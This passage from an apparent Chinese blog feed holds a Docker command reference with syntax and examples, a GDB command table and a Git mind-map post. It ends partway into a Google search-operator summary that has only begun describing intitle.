  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker top mymysql</span><br><span class="line">UID    PID    PPID    C      STIME   TTY  TIME       CMD</span><br><span class="line">999    40347  40331   18     00:58   ?    00:00:02   mysqld</span><br></pre></td></tr></table></figure>

<p>  查看所有运行容器的进程信息。</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for i in  `docker ps |grep Up|awk '{print $1}'`;do echo \ &amp;&amp;docker top $i; done</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="attach"><a href="#attach" class="headerlink" title="attach"></a><code>attach</code></h3><p>连接到正在运行中的容器</p>
<ul>
<li><p>语法</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker attach [OPTIONS] CONTAINER</span><br></pre></td></tr></table></figure>

<p>  要attach上去的容器必须正在运行，可以同时连接上同一个container来共享屏幕（与screen命令的attach类似）。</p>
<p>  官方文档中说attach后可以通过CTRL-C来detach，但实际上经过我的测试，如果container当前在运行bash，CTRL-C自然是当前行的输入，没有退出；如果container当前正在前台运行进程，如输出nginx的access.log日志，CTRL-C不仅会导致退出容器，而且还stop了。这不是我们想要的，detach的意思按理应该是脱离容器终端，但容器依然运行。好在attach是可以带上–sig-proxy=false来确保CTRL-D或CTRL-C不会关闭容器。</p>
</li>
<li><p>实例</p>
<p>  容器mynginx将访问日志指到标准输出，连接到容器查看访问信息。</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker attach --sig-proxy=false mynginx</span><br><span class="line">192.168.239.1 - - [10/Jul/2016:16:54:26 +0000] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" "-"</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="events"><a href="#events" class="headerlink" title="events"></a><code>events</code></h3><p>从服务器获取实时事件</p>
<ul>
<li><p>语法</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker events [OPTIONS]</span><br></pre></td></tr></table></figure></li>
<li><p>OPTIONS说明</p>
<ul>
<li><p>  <code>-f</code> : 根据条件过滤事件；</p>
</li>
<li><p>  <code>--since</code> : 从指定的时间戳后显示所有事件;</p>
</li>
<li><p>  <code>--until</code> : 流水时间显示到指定的时间为止；</p>
</li>
</ul>
</li>
<li><p>实例</p>
<p>  显示docker 2016年7月1日后的所有事件。</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker events  --since="1467302400"</span><br></pre></td></tr></table></figure>

<p>  显示docker 镜像为mysql:5.6 2016年7月1日后的相关事件。</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker events -f "image"="mysql:5.6" --since="1467302400" </span><br></pre></td></tr></table></figure>

<p>  如果指定的时间是到秒级的，需要将时间转成时间戳。如果时间为日期的话，可以直接使用，如–since=”2016-07-01”。</p>
</li>
</ul>
<h3 id="logs"><a href="#logs" class="headerlink" title="logs"></a><code>logs</code></h3><p> 获取容器的日志</p>
<ul>
<li><p>语法</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker logs [OPTIONS] CONTAINER</span><br></pre></td></tr></table></figure></li>
<li><p>OPTIONS说明</p>
<ul>
<li><p>  <code>-f</code> : 跟踪日志输出；</p>
</li>
<li><p>  <code>--since</code> : 显示某个开始时间的所有日志；</p>
</li>
<li><p>  <code>-t</code> : 显示时间戳；</p>
</li>
<li><p>  <code>--tail</code> : 仅列出最新N条容器日志；</p>
</li>
</ul>
</li>
<li><p>实例<br>  跟踪查看容器mynginx的日志输出。</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker logs -f mynginx</span><br></pre></td></tr></table></figure>

<p>  查看容器mynginx从2016年7月1日后的最新10条日志。</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker logs --since="2016-07-01" --tail=10 mynginx</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="wait"><a href="#wait" class="headerlink" title="wait"></a><code>wait</code></h3><p>阻塞运行直到容器停止，然后打印出它的退出代码。</p>
<ul>
<li><p>语法</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker wait [OPTIONS] CONTAINER [CONTAINER...]</span><br></pre></td></tr></table></figure></li>
<li><p>实例</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker wait CONTAINER</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="export"><a href="#export" class="headerlink" title="export"></a><code>export</code></h3><p>将文件系统作为一个tar归档文件导出到STDOUT。</p>
<ul>
<li><p>语法</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker export [OPTIONS] CONTAINER</span><br></pre></td></tr></table></figure></li>
<li><p>OPTIONS说明：</p>
<ul>
<li>  <code>-o</code> : 将输入内容写到文件。</li>
</ul>
</li>
<li><p>实例</p>
<p>  将id为a404c6c174a2的容器按日期保存为tar文件。</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker export -o mysql-`date +%Y%m%d`.tar a404c6c174a2</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="port"><a href="#port" class="headerlink" title="port"></a><code>port</code></h3><p>列出指定的容器的端口映射，或者查找将PRIVATE_PORT NAT到面向公众的端口。</p>
<ul>
<li><p>语法</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker port [OPTIONS] CONTAINER [PRIVATE_PORT[/PROTO]]</span><br></pre></td></tr></table></figure></li>
<li><p>实例</p>
<p>  查看容器mynginx的端口映射情况。</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker port mymysql</span><br><span class="line">3306/tcp -&gt; 0.0.0.0:3306</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="容器rootfs命令"><a href="#容器rootfs命令" class="headerlink" title="容器rootfs命令"></a>容器rootfs命令</h2><h3 id="commit"><a href="#commit" class="headerlink" title="commit"></a><code>commit</code></h3><p>从容器创建一个新的镜像。</p>
<ul>
<li><p>语法</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]</span><br></pre></td></tr></table></figure></li>
<li><p>OPTIONS说明：</p>
<ul>
<li><p>  <code>-a</code> : 提交的镜像作者；</p>
</li>
<li><p>  <code>-c</code> : 使用Dockerfile指令来创建镜像；</p>
</li>
<li><p>  <code>-m</code> : 提交时的说明文字；</p>
</li>
<li><p>  <code>-p</code> : 在commit时，将容器暂停；</p>
</li>
</ul>
</li>
<li><p>实例</p>
<p>  将容器a404c6c174a2 保存为新的镜像,并添加提交人信息和说明信息</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker commit -a "runoob.com" -m "my apache" a404c6c174a2  mymysql:v1</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="cp"><a href="#cp" class="headerlink" title="cp"></a><code>cp</code></h3><p>用于容器与主机之间的数据拷贝。</p>
<ul>
<li><p>语法</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker cp [OPTIONS] CONTAINER:SRC_PATH DEST_PATH|-</span><br><span class="line">docker cp [OPTIONS] SRC_PATH|- CONTAINER:DEST_PATH</span><br></pre></td></tr></table></figure></li>
<li><p>OPTIONS说明</p>
<ul>
<li>  <code>-L</code> : 保持源目标中的链接；</li>
</ul>
</li>
<li><p>实例</p>
<p>  将主机/www/runoob目录拷贝到容器96f7f14e99ab的/www目录下。</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker cp /www/runoob 96f7f14e99ab:/www/</span><br></pre></td></tr></table></figure>

<p>  将主机/www/runoob目录拷贝到容器96f7f14e99ab中，目录重命名为www。</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker cp /www/runoob 96f7f14e99ab:/www</span><br></pre></td></tr></table></figure>

<p>  将容器96f7f14e99ab的/www目录拷贝到主机的/tmp目录中。</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker cp  96f7f14e99ab:/www /tmp/</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="diff"><a href="#diff" class="headerlink" title="diff"></a><code>diff</code></h3><p>检查容器里文件结构的更改。</p>
<ul>
<li><p>语法</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker diff [OPTIONS] CONTAINER</span><br></pre></td></tr></table></figure></li>
<li><p>实例</p>
<p>  查看容器mymysql的文件结构更改。</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker diff mymysql</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="镜像仓库"><a href="#镜像仓库" class="headerlink" title="镜像仓库"></a>镜像仓库</h2><h3 id="login-logout"><a href="#login-logout" class="headerlink" title="login/logout"></a><code>login/logout</code></h3><p>登出一个Docker镜像仓库，如果未指定镜像仓库地址，默认为官方仓库 Docker Hub</p>
<ul>
<li><p>语法</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker login [OPTIONS] [SERVER]</span><br><span class="line">docker logout [OPTIONS] [SERVER]</span><br></pre></td></tr></table></figure></li>
<li><p>OPTIONS说明</p>
<ul>
<li><p>  <code>-u</code> : 登陆的用户名；</p>
</li>
<li><p>  <code>-p</code> : 登陆的密码；</p>
</li>
</ul>
</li>
<li><p>实例</p>
<p>  登陆到Docker Hub</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker login -u 用户名 -p 密码</span><br></pre></td></tr></table></figure>

<p>  登出Docker Hub</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker logout</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="pull"><a href="#pull" class="headerlink" title="pull"></a><code>pull</code></h3><p>从镜像仓库中拉取或者更新指定镜像</p>
<ul>
<li><p>语法</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull [OPTIONS] NAME[:TAG|@DIGEST]</span><br></pre></td></tr></table></figure></li>
<li><p>OPTIONS说明</p>
<ul>
<li><p>  <code>-a</code> : 拉取所有 tagged 镜像；</p>
</li>
<li><p>  <code>--disable-content-trust</code> : 忽略镜像的校验，默认开启；</p>
</li>
</ul>
</li>
<li><p>实例</p>
<p>  从Docker Hub下载java最新版镜像。</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull java</span><br></pre></td></tr></table></figure>

<p>  从Docker Hub下载REPOSITORY为java的所有镜像。</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull -a java</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="push"><a href="#push" class="headerlink" title="push"></a><code>push</code></h3><p>将本地的镜像上传到镜像仓库,要先登陆到镜像仓库</p>
<ul>
<li><p>语法</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker push [OPTIONS] NAME[:TAG]</span><br></pre></td></tr></table></figure></li>
<li><p>OPTIONS说明：</p>
<ul>
<li>  <code>--disable-content-trust</code> : 忽略镜像的校验，默认开启；</li>
</ul>
</li>
<li><p>实例</p>
<p>  上传本地镜像myapache:v1到镜像仓库中。</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker push myapache:v1</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="search"><a href="#search" class="headerlink" title="search"></a><code>search</code></h3><p>从Docker Hub查找镜像</p>
<ul>
<li><p>语法</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker search [OPTIONS] TERM</span><br></pre></td></tr></table></figure></li>
<li><p>OPTIONS说明</p>
<ul>
<li><p>  <code>--automated</code> : 只列出 automated build类型的镜像；</p>
</li>
<li><p>  <code>--no-trunc</code> : 显示完整的镜像描述；</p>
</li>
<li><p>  <code>-f &lt;过滤条件&gt;</code> : 列出收藏数不小于指定值的镜像；</p>
</li>
</ul>
</li>
<li><p>实例</p>
<p>  从 Docker Hub 查找所有镜像名包含 java，并且收藏数大于 10 的镜像</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker search -f stars=10 java</span><br><span class="line"></span><br><span class="line">NAME                  DESCRIPTION                           STARS   OFFICIAL   AUTOMATED</span><br><span class="line">java                  Java is a concurrent, class-based...   1037    [OK]       </span><br><span class="line">anapsix/alpine-java   Oracle Java 8 (and 7) with GLIBC ...   115                [OK]</span><br><span class="line">develar/java                                                 46                 [OK]</span><br><span class="line">isuper/java-oracle    This repository contains all java...   38                 [OK]</span><br><span class="line">lwieske/java-8        Oracle Java 8 Container - Full + ...   27                 [OK]</span><br><span class="line">nimmis/java-centos    This is docker images of CentOS 7...   13                 [OK]</span><br></pre></td></tr></table></figure></li>
<li><p>参数说明：</p>
<ul>
<li><p>  <strong>NAME:</strong> 镜像仓库源的名称</p>
</li>
<li><p>  <strong>DESCRIPTION:</strong> 镜像的描述</p>
</li>
<li><p>  <strong>OFFICIAL:</strong> 是否 docker 官方发布</p>
</li>
<li><p>  <strong>stars:</strong> 类似 Github 里面的 star</p>
</li>
<li><p>  <strong>AUTOMATED:</strong> 自动构建；</p>
</li>
</ul>
</li>
</ul>
<h2 id="本地镜像管理"><a href="#本地镜像管理" class="headerlink" title="本地镜像管理"></a>本地镜像管理</h2><h3 id="images"><a href="#images" class="headerlink" title="images"></a><code>images</code></h3><p>列出本地镜像</p>
<ul>
<li><p>语法</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images [OPTIONS] [REPOSITORY[:TAG]]</span><br></pre></td></tr></table></figure></li>
<li><p>OPTIONS说明</p>
<ul>
<li><p>  <code>-a</code> : 列出本地所有的镜像（含中间映像层，默认情况下，过滤掉中间映像层）；</p>
</li>
<li><p>  <code>--digests</code> : 显示镜像的摘要信息；</p>
</li>
<li><p>  <code>-f</code> : 显示满足条件的镜像；</p>
</li>
<li><p>  <code>--format</code> : 指定返回值的模板文件；</p>
</li>
<li><p>  <code>--no-trunc</code> : 显示完整的镜像信息；</p>
</li>
<li><p>  <code>-q</code> : 只显示镜像ID；</p>
</li>
</ul>
</li>
<li><p>实例</p>
<p>  查看本地镜像列表</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ocker images</span><br><span class="line">REPOSITORY              TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">mymysql                 v1                  37af1236adef        5 minutes ago       329 MB</span><br><span class="line">runoob/ubuntu           v4                  1c06aa18edee        2 days ago          142.1 MB</span><br><span class="line">&lt;none&gt;                  &lt;none&gt;              5c6e1090e771        2 days ago          165.9 MB</span><br><span class="line">httpd                   latest              ed38aaffef30        11 days ago         195.1 MB</span><br><span class="line">alpine                  latest              4e38e38c8ce0        2 weeks ago         4.799 MB</span><br><span class="line">mongo                   3.2                 282fd552add6        3 weeks ago         336.1 MB</span><br><span class="line">redis                   latest              4465e4bcad80        3 weeks ago         185.7 MB</span><br><span class="line">php                     5.6-fpm             025041cd3aa5        3 weeks ago         456.3 MB</span><br><span class="line">python                  3.5                 045767ddf24a        3 weeks ago         684.1 MB</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>  列出本地镜像中REPOSITORY为ubuntu的镜像列表。</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images ubuntu</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">ubuntu              14.04               90d5884b1ee0        9 weeks ago         188 MB</span><br><span class="line">ubuntu              15.10               4e3b13c8a266        3 months ago        136.3 MB</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="rmi"><a href="#rmi" class="headerlink" title="rmi"></a><code>rmi</code></h3><p>删除本地一个或多个镜像。</p>
<ul>
<li><p>语法</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rmi [OPTIONS] IMAGE [IMAGE...]</span><br></pre></td></tr></table></figure></li>
<li><p>OPTIONS说明</p>
<ul>
<li>  <code>-f</code> : 强制删除；</li>
<li>  <code>--no-prune</code> : 不移除该镜像的过程镜像，默认移除；</li>
</ul>
</li>
<li><p>实例</p>
<p>  强制删除本地镜像 runoob/ubuntu:v4。</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rmi -f runoob/ubuntu:v4</span><br></pre></td></tr></table></figure>



<h3 id="tag"><a href="#tag" class="headerlink" title="tag"></a><code>tag</code></h3><p>标记本地镜像，将其归入某一仓库。</p>
<ul>
<li><p>语法</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker tag [OPTIONS] IMAGE[:TAG] [REGISTRYHOST/][USERNAME/]NAME[:TAG]</span><br></pre></td></tr></table></figure></li>
<li><p>实例</p>
<p>  将镜像ubuntu:15.10标记为 runoob/ubuntu:v3 镜像。</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker tag ubuntu:15.10 runoob/ubuntu:v3</span><br></pre></td></tr></table></figure>



<h3 id="build"><a href="#build" class="headerlink" title="build"></a><code>build</code></h3><p>命令用于使用 Dockerfile 创建镜像。</p>
<ul>
<li><p>语法</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build [OPTIONS] PATH | URL | -</span><br></pre></td></tr></table></figure></li>
<li><p>OPTIONS说明</p>
<ul>
<li><p>  <code>--build-arg=[]</code> : 设置镜像创建时的变量；</p>
</li>
<li><p>  <code>--cpu-shares</code> : 设置 cpu 使用权重；</p>
</li>
<li><p>  <code>--cpu-period</code> : 限制 CPU CFS周期；</p>
</li>
<li><p>  <code>--cpu-quota</code> : 限制 CPU CFS配额；</p>
</li>
<li><p>  <code>--cpuset-cpus</code> : 指定使用的CPU id；</p>
</li>
<li><p>  <code>--cpuset-mems</code> : 指定使用的内存 id；</p>
</li>
<li><p>  <code>--disable-content-trust</code> : 忽略校验，默认开启；</p>
</li>
<li><p>  <code>-f</code> : 指定要使用的Dockerfile路径；</p>
</li>
<li><p>  <code>--force-rm</code> : 设置镜像过程中删除中间容器；</p>
</li>
<li><p>  <code>--isolation</code> : 使用容器隔离技术；</p>
</li>
<li><p>  <code>--label=[]</code> : 设置镜像使用的元数据；</p>
</li>
<li><p>  <code>-m</code> : 设置内存最大值；</p>
</li>
<li><p>  <code>--memory-swap</code> : 设置Swap的最大值为内存+swap，”-1”表示不限swap；</p>
</li>
<li><p>  <code>--no-cache</code> : 创建镜像的过程不使用缓存；</p>
</li>
<li><p>  <code>--pull</code> : 尝试去更新镜像的新版本；</p>
</li>
<li><p>  <code>--quiet, -q</code> : 安静模式，成功后只输出镜像 ID；</p>
</li>
<li><p>  <code>--rm</code> : 设置镜像成功后删除中间容器；</p>
</li>
<li><p>  <code>--shm-size</code> : 设置/dev/shm的大小，默认值是64M；</p>
</li>
<li><p>  <code>--ulimit</code> : Ulimit配置。</p>
</li>
<li><p>  <code>--squash</code> : 将 Dockerfile 中所有的操作压缩为一层；</p>
</li>
<li><p>  <code>--tag, -t</code> : 镜像的名字及标签，通常 name:tag 或者 name 格式；可以在一次构建中为一个镜像设置多个标签；</p>
</li>
<li><p>  <code>--network</code> : 默认 default。在构建期间设置RUN指令的网络模式；</p>
</li>
</ul>
</li>
<li><p>实例</p>
<p>  使用当前目录的 Dockerfile 创建镜像，标签为 runoob/ubuntu:v1。</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build -t runoob/ubuntu:v1 . </span><br></pre></td></tr></table></figure>

<p>  使用URL <strong>github.com/creack/docker-firefox</strong> 的 Dockerfile 创建镜像。</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build github.com/creack/docker-firefox</span><br></pre></td></tr></table></figure>

<p>  也可以通过 -f Dockerfile 文件的位置：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build -f /path/to/a/Dockerfile .</span><br></pre></td></tr></table></figure>

<p>  在 Docker 守护进程执行 Dockerfile 中的指令前，首先会对 Dockerfile 进行语法检查，有语法错误时会返回：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build -t test/myapp .</span><br><span class="line">Sending build context to Docker daemon 2.048 kB</span><br><span class="line">Error response from daemon: Unknown instruction: RUNCMD</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="history"><a href="#history" class="headerlink" title="history"></a><code>history</code></h3><p>查看指定镜像的创建历史。</p>
<ul>
<li><p>语法</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker history [OPTIONS] IMAGE</span><br></pre></td></tr></table></figure></li>
<li><p>OPTIONS说明</p>
<ul>
<li>  <code>-H</code> : 以可读的格式打印镜像大小和日期，默认为true；</li>
<li>  <code>--no-trunc</code> : 显示完整的提交记录；</li>
<li>  <code>-q</code> : 仅列出提交记录ID；</li>
</ul>
</li>
<li><p>实例</p>
<p>  查看本地镜像runoob/ubuntu:v3的创建历史</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker history runoob/ubuntu:v3</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="save"><a href="#save" class="headerlink" title="save"></a><code>save</code></h3><p>将指定镜像保存成 tar 归档文件。</p>
<ul>
<li><p>语法</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker save [OPTIONS] IMAGE [IMAGE...]</span><br></pre></td></tr></table></figure></li>
<li><p>OPTIONS 说明</p>
<ul>
<li>  <code>-o</code> : 输出到的文件；</li>
</ul>
</li>
<li><p>实例</p>
<p>  将镜像 ubuntu:v3 生成 my_ubuntu_v3.tar 文档</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker save -o my_ubuntu_v3.tar ubuntu:v3</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="load"><a href="#load" class="headerlink" title="load"></a><code>load</code></h3><p>导入使用<code>docker save</code>命令导出的镜像</p>
<ul>
<li><p>语法</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker load [OPTIONS]</span><br></pre></td></tr></table></figure></li>
<li><p>OPTIONS 说明</p>
<ul>
<li>  <code>--input , -i</code> : 指定导入的文件，代替 STDIN；</li>
<li>  <code>--quiet , -q</code> : 精简输出信息；</li>
</ul>
</li>
<li><p>实例</p>
<p>  导入镜像：</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker load &lt; busybox.tar.gz</span><br><span class="line">docker load --input fedora.tar</span><br></pre></td></tr></table></figure>



<h3 id="import"><a href="#import" class="headerlink" title="import"></a><code>import</code></h3><p>从归档文件中创建镜像。</p>
<ul>
<li><p>语法</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker import [OPTIONS] file|URL|- [REPOSITORY[:TAG]]</span><br></pre></td></tr></table></figure></li>
<li><p>OPTIONS说明</p>
<ul>
<li><p>  <code>-c</code> : 应用docker 指令创建镜像；</p>
</li>
<li><p>  <code>-m</code> : 提交时的说明文字；</p>
</li>
</ul>
</li>
<li><p>实例</p>
<p>  从镜像归档文件my_ubuntu_v3.tar创建镜像，命名为hello/ubuntu:v4</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker import  my_ubuntu_v3.tar hello/ubuntu:v4 </span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="info-version"><a href="#info-version" class="headerlink" title="info|version"></a>info|version</h2><h3 id="info"><a href="#info" class="headerlink" title="info"></a><code>info</code></h3><p>显示 Docker 系统信息，包括镜像和容器数</p>
<ul>
<li><p>语法</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker info [OPTIONS]</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="version"><a href="#version" class="headerlink" title="version"></a><code>version</code></h3><p>显示 Docker 版本信息</p>
<ul>
<li><p>语法</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker version [OPTIONS]</span><br></pre></td></tr></table></figure></li>
<li><p>OPTIONS说明</p>
<ul>
<li>  <code>-f</code> : 指定返回值的模板文件；</li>
</ul>
</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[1] <a href="https://www.runoob.com/docker/docker-command-manual.html">https://www.runoob.com/docker/docker-command-manual.html</a></p>
<p>[2]<a href="https://docs.docker.com/">https://docs.docker.com/</a></p>
]]></content>
      <categories>
        <category>docker learning</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>GDB命令简介</title>
    <url>/GDB%E5%91%BD%E4%BB%A4%E7%AE%80%E4%BB%8B.html</url>
    <content><![CDATA[<p>GDB命令简单总结。<span id="more"></span></p>
<h1 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h1><style> 
    table 
    th:first-of-type {     width: 20%; } 
    th:nth-of-type(2) {     width: 55%; }
    th:nth-of-type(3) {     width: 25%; }
</style>

<table>
<thead>
<tr>
<th align="left">命令</th>
<th>解释</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">file &lt;文件名&gt;</td>
<td>加载被调试的可执行程序文件。<br />一般都在被调试程序所在目录下执行GDB，因而文本名不需要带路径。</td>
<td>(gdb) file gdb-sample</td>
</tr>
<tr>
<td align="left">r</td>
<td>Run的简写，运行被调试的程序。<br/>如果此前没有下过断点，则执行完整个程序；如果有断点，则程序暂停在第一个可用断点处。</td>
<td>(gdb) r</td>
</tr>
<tr>
<td align="left">c</td>
<td>Continue的简写，继续执行被调试程序，直至下一个断点或程序结束。</td>
<td>(gdb) c</td>
</tr>
<tr>
<td align="left">b &lt;行号&gt; <br />b &lt;函数名称&gt; <br />b *&lt;函数名称&gt; <br />b *&lt;代码地址&gt; <br />d [编号]</td>
<td>b: Breakpoint的简写，设置断点。两可以使用“行号”“函数名称”“执行地址”等方式指定断点位置。<br/>其中在函数名称前面加“*”符号表示将断点设置在“由编译器生成的prolog代码处”。如果不了解汇编，可以不予理会此用法。<br/>d: Delete breakpoint的简写，删除指定编号的某个断点，或删除所有断点。断点编号从1开始递增。</td>
<td>(gdb) b 8 <br />(gdb) b main <br />(gdb) b *main <br />(gdb) b *0x804835c</td>
</tr>
<tr>
<td align="left">s, n</td>
<td>s: 执行一行源程序代码，如果此行代码中有函数调用，则进入该函数；<br /> n: 执行一行源程序代码，此行代码中的函数调用也一并执行；<br />s 相当于其它调试器中的“Step Into (单步跟踪进入)”； <br />n 相当于其它调试器中的“Step Over (单步跟踪)”。<br />这两个命令必须在有源代码调试信息的情况下才可以使用（GCC编译时使用“-g”参数）。</td>
<td>(gdb) s<br/>(gdb) n</td>
</tr>
<tr>
<td align="left">si, ni</td>
<td>si命令类似于s命令，ni命令类似于n命令。所不同的是，这两个命令（si/ni）所针对的是汇编指令，而s/n针对的是源代码。</td>
<td>(gdb) si<br/>(gdb) ni</td>
</tr>
<tr>
<td align="left">p &lt;变量名称&gt;</td>
<td>Print的简写，显示指定变量（临时变量或全局变量）的值。</td>
<td>(gdb) p i<br/>(gdb) p nGlobalVar</td>
</tr>
<tr>
<td align="left">display … <br />undisplay &lt;编号&gt;</td>
<td>display，设置程序中断后欲显示的数据及其格式。<br />例如，如果希望每次程序中断后可以看到即将被执行的下一条汇编指令，可以使用命令<code>display /i $pc</code>其中<code>$pc</code>代表当前汇编指令，<code>/i</code>表示以十六进行显示。当需要关心汇编代码时，此命令相当有用。<br />undispaly，取消先前的display设置，编号从1开始递增。</td>
<td>(gdb) display /i $pc<br />(gdb) undisplay 1</td>
</tr>
<tr>
<td align="left">i</td>
<td>Info的简写，用于显示各类信息，详情请查阅“help i”。</td>
<td>(gdb) i r</td>
</tr>
<tr>
<td align="left">q</td>
<td>Quit的简写，退出GDB调试环境。</td>
<td>(gdb) q</td>
</tr>
<tr>
<td align="left">help [命令名称]</td>
<td>GDB帮助命令，提供对GDB名种命令的解释说明。<br/>如果指定了“命令名称”参数，则显示该命令的详细说明；如果没有指定参数，则分类显示所有GDB命令，供用户进一步浏览和查询。</td>
<td>(gdb) help display</td>
</tr>
</tbody></table>
<h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1><p>未完待续—</p>
]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>gdb</tag>
      </tags>
  </entry>
  <entry>
    <title>Git思维导图</title>
    <url>/Git%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE.html</url>
    <content><![CDATA[<h1 id="Git思维导图"><a href="#Git思维导图" class="headerlink" title="Git思维导图"></a>Git思维导图</h1><span id="more"></span>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/git%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE.png"></p>
<p>转载：<a href="https://www.processon.com/mindmap/610674165653bb32a581cd93">https://www.processon.com/mindmap/610674165653bb32a581cd93</a></p>
]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>git command</tag>
      </tags>
  </entry>
  <entry>
    <title>Google Hacking 总结</title>
    <url>/Google-Hacking-%E6%80%BB%E7%BB%93.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>趁着假期整理了一份时常使用的<code>Google Hacking</code>语法；<span id="more"></span></p>
<h1 id="Google快速查找操作符"><a href="#Google快速查找操作符" class="headerlink" title="Google快速查找操作符"></a>Google快速查找操作符</h1><ol>
<li><code>intitle</code><ul>
<li>在页面中查找字符串；</li>
<li>能够很好地和其他操作符混合使用；</li>
</ul>
</li>
